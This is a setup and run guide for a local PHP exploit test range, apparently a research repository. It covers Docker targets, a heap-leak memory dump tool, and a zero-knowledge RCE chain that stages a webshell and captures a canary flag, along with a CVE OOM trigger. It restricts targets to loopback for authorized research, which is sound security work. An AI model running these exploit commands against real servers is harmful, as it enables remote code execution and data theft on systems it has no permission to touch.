# Manual firing-range setup + exploit run guide

Authorized research only: the tools hard-refuse any non-loopback target,
and this range exists to be broken. Keep it on 127.0.0.1.

## 0. Requirements
- Linux (any arch), Docker + compose v2 (`docker compose version`)
- python3 (stdlib only; no pip installs)
- Repo files needed together in one dir: `phpbleed-bastet.py`,
  `phpbleed_chain.py`, `docker-compose.yml`, `range/`
- x86-64 hosts: the `bleed81arm` service needs qemu binfmt
  (`docker run --privileged --rm tonistiigi/binfmt --install arm64`);
  skip that service if you don't want it. Everything else is native.
- Validation to date was done on aarch64; the vendored chain's constants
  were originally x86-64-tuned, so x86-64 should behave at least as well
  (vendor's home turf) but that's the vendor's claim, not ours.

## 1. Bring up targets
```
git clone https://github.com/bastet-ai/php-firing-range.git && cd php-firing-range
docker compose up -d --build phpbleed          # main exploit target (:8088)
docker compose up -d --build bleed82 bleedsrv t4b phpinfo   # extras
docker compose up -d bleednoaslr               # no-ASLR contrast (scoped seccomp)
docker compose up -d bleed81arm                # arm64 (needs binfmt on x86 hosts)
```
Verify a target answers the gadget (reflection proves the app, not just the port):
```
curl -s -X POST http://127.0.0.1:8088/index.php --data-urlencode 'cook=s:2:"ok";'
# expect: s:2:"ok";
```

## 2. Port roster (all 127.0.0.1-only)
- 8088 phpbleed     php 8.5.11-apache, C: gadget app, /CANARY  <- main target
- 8089 bleed82      php 8.2-apache, same app, own canary
- 8090 bleed81arm   php 8.1-apache ARM64 (arch diversity)
- 8092 bleedsrv     php 8.4 php -S (SAPI diversity)
- 8096 t4b          zero-gadget session-decode experiment (WIP)
- 8098 t4a          arbitrary-target sink: serialize(unserialize($_POST['cook'])),
                    zero app classes (stock-SPL shaping, WIP; baked canary)
- 8097 bleednoaslr  8.5.11 under setarch --addr-no-randomize (contrast;
                    seccomp unconfined ON THIS SERVICE ONLY, loopback)
- 8093 phpinfo, 8094 wordpress+mysql, 8095 magento-fpm (diversity/census)
- 8083 surface lab (CVE-2026-109618 OOM mile), 8181 shakedown,
  8082/8091/8056 version surface

## 3. Run the tools (refactor 2026-10-24: php2shell owns RCE, phpbleed bleeds)
One stream per container at a time (both tools take the SAME per-target
flock; a second concurrent stream - from either tool - refuses and exits).
Restart for a fresh heap between full attempts:
`docker restart php-firing-range-phpbleed-1`

Bleed (memory dump over the serialize echo channel) - phpbleed:
```
python3 phpbleed-bastet.py dump http://127.0.0.1:8088/index.php \
    --pages 8 --read-len 0x100000 --out /tmp/heap.dump
# ~1MB/16 requests; window = worker heap around the leaked arena
```
Classify a pointer / find the DSO base via the leak - phpbleed:
```
python3 phpbleed-bastet.py probe http://127.0.0.1:8088/index.php
```
RCE, zero knowledge (no addresses needed - ASLR is defeated by the leak;
chain: heap leak -> libphp scan -> .gnu_hash -> GOT/libc -> ce -> spray) -
php2shell, dispatch route (moved from phpbleed 2026-10-24):
```
python3 php2shell-bastet.py id http://127.0.0.1:8088/index.php --cmd 'id>/tmp/x'
docker exec php-firing-range-phpbleed-1 cat /tmp/x
# expect: uid=33(www-data)   ("no response" on R-7 is normal: worker dies)
```
Full score - staged webshell + canary fetch - php2shell dispatch:
```
python3 php2shell-bastet.py shell http://127.0.0.1:8088/index.php \
    --webshell r.php --fetch /CANARY
# banner ends: CANARY CAPTURED :: FLAG{phpbleed:...}
# independent verification:
docker exec php-firing-range-phpbleed-1 cat /CANARY
# then clean the webshell off your own target:
docker exec php-firing-range-phpbleed-1 rm -f /var/www/html/r.php /var/www/html/w
```
Legacy fast path (repeat shots, same container, offsets already known):
`id` mode plus `--ce 0x... --system 0x... --spray 0x...` (skip re-derivation).
Other php2shell routes: `--route groom` = the CVE-2026-109618/619 two-update
path (legacy single-positional invocation, still needs heap tuning);
`--route serializer` = va-borrowed fake-ps_serializer design (EXPERIMENTAL,
--dry gated, needs --bias + --ps-serializer-off; see TODO VA #3).

## 4. The 618 lab (:8083) is a different bug (CVE-2026-109618)
Trigger (DoS-grade, vendor phpt shape) works with the tooling above, but
there is NO working shell for it yet (GLM lane holds the last mile).
```
curl -s http://127.0.0.1:8083/lab/memprobe.php          # limit=2M
curl -s http://127.0.0.1:8083/lab/ | grep -c Fatal      # baseline 0
# one OOM trigger: POST multipart with 1MB PHP_SESSION_UPLOAD_PROGRESS
# see lanes/race-618/ and research/shared/DAUBOIS-KEYPOINTS.md for shapes
```

## 5. Gotchas we already paid for (see research/phpbleed/PLAN.md)
- Pin images by digest/version (`php:8.5.11-apache`); a tag roll moved
  .bss under the tuned offsets mid-session. Assert PHP_VERSION in the
  container before firing.
- One exploit stream per container (shared sprays thrash each other's heaps).
- `docker compose up --build` on a floating tag can silently change the
  target; our compose pins versions deliberately. Don't "upgrade" them.
- Verify content (reflection curl), not just open ports, when checking
  readiness - crash-loops answer between restarts.
- t4b/8096 and the CVE-618 mile are WORK IN PROGRESS; don't expect a
  canary there yet.

## amd64 lanes on an arm64 host (wordpress-x86 :8099)
This host is aarch64 and there is no native amd64 box on the network,
so the -x86 lanes need qemu binfmt WITH the F (fix-binary) flag — plain
tonistiigi/binfmt registration does not reach container execs (mysql
crash-looped 'exec format error'). Register:
  sudo apt-get install -y qemu-user-static
  sudo python3 scripts/register-amd64-binfmt.py   # prints x86_64 on success
Note: heavy amd64 daemons (mysql:8.0 AND mariadb:11 both SIGSEGV under
qemu-user here - QEMU internal SIGSEGV at entrypoint). The -x86 lanes run
qemu only for their PHP/HTTP part; wpdb-x86 is native arm64 mysql (DB arch
is irrelevant - TCP wire protocol). Keep DB/engine images native; emu only
the app being studied.
